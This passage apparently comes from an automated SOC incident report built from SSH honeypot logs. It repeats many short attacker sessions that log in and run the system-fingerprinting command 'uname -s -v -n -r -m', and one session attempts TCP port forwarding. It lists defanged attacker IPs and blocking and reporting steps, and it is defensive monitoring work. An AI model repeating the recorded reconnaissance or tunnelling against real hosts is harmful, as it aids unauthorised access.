| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:39:19` | `cowrie.session.connect` |
| `2026-07-30 16:39:19` | `cowrie.client.version` |
| `2026-07-30 16:39:19` | `cowrie.client.kex` |
| `2026-07-30 16:39:19` | `cowrie.login.success` |
| `2026-07-30 16:39:20` | `cowrie.session.params` |
| `2026-07-30 16:39:20` | `cowrie.command.input` |
| `2026-07-30 16:39:20` | `cowrie.log.closed` |
| `2026-07-30 16:39:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb9cbbe0b3c8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:39 |
| **Last Seen** | 2026-07-30 16:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:39:24` | `cowrie.session.connect` |
| `2026-07-30 16:39:25` | `cowrie.client.version` |
| `2026-07-30 16:39:25` | `cowrie.client.kex` |
| `2026-07-30 16:39:25` | `cowrie.login.success` |
| `2026-07-30 16:39:26` | `cowrie.session.params` |
| `2026-07-30 16:39:26` | `cowrie.command.input` |
| `2026-07-30 16:39:26` | `cowrie.log.closed` |
| `2026-07-30 16:39:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e84b99d9b8b2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:39 |
| **Last Seen** | 2026-07-30 16:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:39:31` | `cowrie.session.connect` |
| `2026-07-30 16:39:31` | `cowrie.client.version` |
| `2026-07-30 16:39:31` | `cowrie.client.kex` |
| `2026-07-30 16:39:32` | `cowrie.login.success` |
| `2026-07-30 16:39:33` | `cowrie.session.params` |
| `2026-07-30 16:39:33` | `cowrie.command.input` |
| `2026-07-30 16:39:33` | `cowrie.log.closed` |
| `2026-07-30 16:39:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74b058f5f72c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:39 |
| **Last Seen** | 2026-07-30 16:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:39:37` | `cowrie.session.connect` |
| `2026-07-30 16:39:37` | `cowrie.client.version` |
| `2026-07-30 16:39:37` | `cowrie.client.kex` |
| `2026-07-30 16:39:38` | `cowrie.login.success` |
| `2026-07-30 16:39:39` | `cowrie.session.params` |
| `2026-07-30 16:39:39` | `cowrie.command.input` |
| `2026-07-30 16:39:39` | `cowrie.log.closed` |
| `2026-07-30 16:39:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e547e13f47b7

| Field | Detail |
|---|---|
| **Source IP** | `185.15.189[.]232` |
| **First Seen** | 2026-07-30 16:39 |
| **Last Seen** | 2026-07-30 16:39 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:39:40` | `cowrie.session.connect` |
| `2026-07-30 16:39:41` | `cowrie.client.version` |
| `2026-07-30 16:39:41` | `cowrie.client.kex` |
| `2026-07-30 16:39:42` | `cowrie.login.success` |
| `2026-07-30 16:39:42` | `cowrie.direct-tcpip.request` |
| `2026-07-30 16:39:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.15.189[.]232` to AbuseIPDB if not already reported
- [ ] Block `185.15.189[.]232` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a515dd0d9297

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:39 |
| **Last Seen** | 2026-07-30 16:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:39:43` | `cowrie.session.connect` |
| `2026-07-30 16:39:43` | `cowrie.client.version` |
| `2026-07-30 16:39:43` | `cowrie.client.kex` |
| `2026-07-30 16:39:43` | `cowrie.login.success` |
| `2026-07-30 16:39:44` | `cowrie.session.params` |
| `2026-07-30 16:39:44` | `cowrie.command.input` |
| `2026-07-30 16:39:45` | `cowrie.log.closed` |
| `2026-07-30 16:39:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-212b60b5fa01

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:39 |
| **Last Seen** | 2026-07-30 16:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:39:49` | `cowrie.session.connect` |
| `2026-07-30 16:39:49` | `cowrie.client.version` |
| `2026-07-30 16:39:49` | `cowrie.client.kex` |
| `2026-07-30 16:39:49` | `cowrie.login.success` |
| `2026-07-30 16:39:50` | `cowrie.session.params` |
| `2026-07-30 16:39:50` | `cowrie.command.input` |
| `2026-07-30 16:39:51` | `cowrie.log.closed` |
| `2026-07-30 16:39:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a07dd20bd071

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:39 |
| **Last Seen** | 2026-07-30 16:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:39:54` | `cowrie.session.connect` |
| `2026-07-30 16:39:54` | `cowrie.client.version` |
| `2026-07-30 16:39:54` | `cowrie.client.kex` |
| `2026-07-30 16:39:55` | `cowrie.login.success` |
| `2026-07-30 16:39:56` | `cowrie.session.params` |
| `2026-07-30 16:39:56` | `cowrie.command.input` |
| `2026-07-30 16:39:56` | `cowrie.log.closed` |
| `2026-07-30 16:39:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22c94aa7acae

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:40 |
| **Last Seen** | 2026-07-30 16:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:40:00` | `cowrie.session.connect` |
| `2026-07-30 16:40:00` | `cowrie.client.version` |
| `2026-07-30 16:40:00` | `cowrie.client.kex` |
| `2026-07-30 16:40:00` | `cowrie.login.success` |
| `2026-07-30 16:40:01` | `cowrie.session.params` |
| `2026-07-30 16:40:01` | `cowrie.command.input` |
| `2026-07-30 16:40:01` | `cowrie.log.closed` |
| `2026-07-30 16:40:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e68c9a9095b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:40 |
| **Last Seen** | 2026-07-30 16:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:40:06` | `cowrie.session.connect` |
| `2026-07-30 16:40:06` | `cowrie.client.version` |
| `2026-07-30 16:40:06` | `cowrie.client.kex` |
| `2026-07-30 16:40:06` | `cowrie.login.success` |
| `2026-07-30 16:40:07` | `cowrie.session.params` |
| `2026-07-30 16:40:07` | `cowrie.command.input` |
| `2026-07-30 16:40:07` | `cowrie.log.closed` |
| `2026-07-30 16:40:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d1a5525c10b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:40 |
| **Last Seen** | 2026-07-30 16:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:40:11` | `cowrie.session.connect` |
| `2026-07-30 16:40:11` | `cowrie.client.version` |
| `2026-07-30 16:40:11` | `cowrie.client.kex` |
| `2026-07-30 16:40:12` | `cowrie.login.success` |
| `2026-07-30 16:40:13` | `cowrie.session.params` |
| `2026-07-30 16:40:13` | `cowrie.command.input` |
| `2026-07-30 16:40:13` | `cowrie.log.closed` |
| `2026-07-30 16:40:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb80a284c73b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:40 |
| **Last Seen** | 2026-07-30 16:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:40:17` | `cowrie.session.connect` |
| `2026-07-30 16:40:17` | `cowrie.client.version` |
| `2026-07-30 16:40:17` | `cowrie.client.kex` |
| `2026-07-30 16:40:18` | `cowrie.login.success` |
| `2026-07-30 16:40:18` | `cowrie.session.params` |
| `2026-07-30 16:40:18` | `cowrie.command.input` |
| `2026-07-30 16:40:19` | `cowrie.log.closed` |
| `2026-07-30 16:40:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c93b1066c43

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:40 |
| **Last Seen** | 2026-07-30 16:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:40:23` | `cowrie.session.connect` |
| `2026-07-30 16:40:23` | `cowrie.client.version` |
| `2026-07-30 16:40:23` | `cowrie.client.kex` |
| `2026-07-30 16:40:24` | `cowrie.login.success` |
| `2026-07-30 16:40:24` | `cowrie.session.params` |
| `2026-07-30 16:40:24` | `cowrie.command.input` |
| `2026-07-30 16:40:25` | `cowrie.log.closed` |
| `2026-07-30 16:40:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c81d0295f698

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:40 |
| **Last Seen** | 2026-07-30 16:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:40:28` | `cowrie.session.connect` |
| `2026-07-30 16:40:28` | `cowrie.client.version` |
| `2026-07-30 16:40:28` | `cowrie.client.kex` |
| `2026-07-30 16:40:29` | `cowrie.login.success` |
| `2026-07-30 16:40:30` | `cowrie.session.params` |
| `2026-07-30 16:40:30` | `cowrie.command.input` |
| `2026-07-30 16:40:31` | `cowrie.log.closed` |
| `2026-07-30 16:40:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b94e545d5b27

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:40 |
| **Last Seen** | 2026-07-30 16:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:40:34` | `cowrie.session.connect` |
| `2026-07-30 16:40:34` | `cowrie.client.version` |
| `2026-07-30 16:40:34` | `cowrie.client.kex` |
| `2026-07-30 16:40:34` | `cowrie.login.success` |
| `2026-07-30 16:40:35` | `cowrie.session.params` |
| `2026-07-30 16:40:35` | `cowrie.command.input` |
| `2026-07-30 16:40:36` | `cowrie.log.closed` |
| `2026-07-30 16:40:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98f2f3d64117

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:40 |
| **Last Seen** | 2026-07-30 16:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:40:39` | `cowrie.session.connect` |
| `2026-07-30 16:40:39` | `cowrie.client.version` |
| `2026-07-30 16:40:39` | `cowrie.client.kex` |
| `2026-07-30 16:40:40` | `cowrie.login.success` |
| `2026-07-30 16:40:41` | `cowrie.session.params` |
| `2026-07-30 16:40:41` | `cowrie.command.input` |
| `2026-07-30 16:40:41` | `cowrie.log.closed` |
| `2026-07-30 16:40:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08ee36df70dc

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:40 |
| **Last Seen** | 2026-07-30 16:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:40:45` | `cowrie.session.connect` |
| `2026-07-30 16:40:45` | `cowrie.client.version` |
| `2026-07-30 16:40:45` | `cowrie.client.kex` |
| `2026-07-30 16:40:46` | `cowrie.login.success` |
| `2026-07-30 16:40:47` | `cowrie.session.params` |
| `2026-07-30 16:40:47` | `cowrie.command.input` |
| `2026-07-30 16:40:47` | `cowrie.log.closed` |
| `2026-07-30 16:40:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44e50c2c6a7b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:40 |
| **Last Seen** | 2026-07-30 16:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:40:51` | `cowrie.session.connect` |
| `2026-07-30 16:40:51` | `cowrie.client.version` |
| `2026-07-30 16:40:51` | `cowrie.client.kex` |
| `2026-07-30 16:40:51` | `cowrie.login.success` |
| `2026-07-30 16:40:52` | `cowrie.session.params` |
| `2026-07-30 16:40:52` | `cowrie.command.input` |
| `2026-07-30 16:40:52` | `cowrie.log.closed` |
| `2026-07-30 16:40:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70ec013ed90c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:40 |
| **Last Seen** | 2026-07-30 16:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:40:57` | `cowrie.session.connect` |
| `2026-07-30 16:40:57` | `cowrie.client.version` |
| `2026-07-30 16:40:57` | `cowrie.client.kex` |
| `2026-07-30 16:40:57` | `cowrie.login.success` |
| `2026-07-30 16:40:58` | `cowrie.session.params` |
| `2026-07-30 16:40:58` | `cowrie.command.input` |
| `2026-07-30 16:40:59` | `cowrie.log.closed` |
| `2026-07-30 16:40:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8294d18276ca

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:41 |
| **Last Seen** | 2026-07-30 16:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:41:02` | `cowrie.session.connect` |
| `2026-07-30 16:41:02` | `cowrie.client.version` |
| `2026-07-30 16:41:02` | `cowrie.client.kex` |
| `2026-07-30 16:41:03` | `cowrie.login.success` |
| `2026-07-30 16:41:04` | `cowrie.session.params` |
| `2026-07-30 16:41:04` | `cowrie.command.input` |
| `2026-07-30 16:41:04` | `cowrie.log.closed` |
| `2026-07-30 16:41:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-785c1c6a86f3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:41 |
| **Last Seen** | 2026-07-30 16:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:41:08` | `cowrie.session.connect` |
| `2026-07-30 16:41:08` | `cowrie.client.version` |
| `2026-07-30 16:41:08` | `cowrie.client.kex` |
| `2026-07-30 16:41:09` | `cowrie.login.success` |
| `2026-07-30 16:41:10` | `cowrie.session.params` |
| `2026-07-30 16:41:10` | `cowrie.command.input` |
| `2026-07-30 16:41:10` | `cowrie.log.closed` |
| `2026-07-30 16:41:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c4eb2e3cadb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:41 |
| **Last Seen** | 2026-07-30 16:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:41:13` | `cowrie.session.connect` |
| `2026-07-30 16:41:14` | `cowrie.client.version` |
| `2026-07-30 16:41:14` | `cowrie.client.kex` |
| `2026-07-30 16:41:14` | `cowrie.login.success` |
| `2026-07-30 16:41:16` | `cowrie.session.params` |
| `2026-07-30 16:41:16` | `cowrie.command.input` |
| `2026-07-30 16:41:16` | `cowrie.log.closed` |
| `2026-07-30 16:41:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f6a9a21587f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:41 |
| **Last Seen** | 2026-07-30 16:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:41:19` | `cowrie.session.connect` |
| `2026-07-30 16:41:20` | `cowrie.client.version` |
| `2026-07-30 16:41:20` | `cowrie.client.kex` |
| `2026-07-30 16:41:21` | `cowrie.login.success` |
| `2026-07-30 16:41:22` | `cowrie.session.params` |
| `2026-07-30 16:41:22` | `cowrie.command.input` |
| `2026-07-30 16:41:22` | `cowrie.log.closed` |
| `2026-07-30 16:41:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df1aad6da4cc

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:41 |
| **Last Seen** | 2026-07-30 16:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:41:25` | `cowrie.session.connect` |
| `2026-07-30 16:41:25` | `cowrie.client.version` |
| `2026-07-30 16:41:25` | `cowrie.client.kex` |
| `2026-07-30 16:41:26` | `cowrie.login.success` |
| `2026-07-30 16:41:28` | `cowrie.session.params` |
| `2026-07-30 16:41:28` | `cowrie.command.input` |
| `2026-07-30 16:41:28` | `cowrie.log.closed` |
| `2026-07-30 16:41:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a92f3bcdccd3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:41 |
| **Last Seen** | 2026-07-30 16:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:41:31` | `cowrie.session.connect` |
| `2026-07-30 16:41:31` | `cowrie.client.version` |
| `2026-07-30 16:41:31` | `cowrie.client.kex` |
| `2026-07-30 16:41:31` | `cowrie.login.success` |
| `2026-07-30 16:41:33` | `cowrie.session.params` |
| `2026-07-30 16:41:33` | `cowrie.command.input` |
| `2026-07-30 16:41:33` | `cowrie.log.closed` |
| `2026-07-30 16:41:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce4619dba712

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:41 |
| **Last Seen** | 2026-07-30 16:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:41:37` | `cowrie.session.connect` |
| `2026-07-30 16:41:37` | `cowrie.client.version` |
| `2026-07-30 16:41:37` | `cowrie.client.kex` |
| `2026-07-30 16:41:38` | `cowrie.login.success` |
| `2026-07-30 16:41:39` | `cowrie.session.params` |
| `2026-07-30 16:41:39` | `cowrie.command.input` |
| `2026-07-30 16:41:39` | `cowrie.log.closed` |
| `2026-07-30 16:41:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
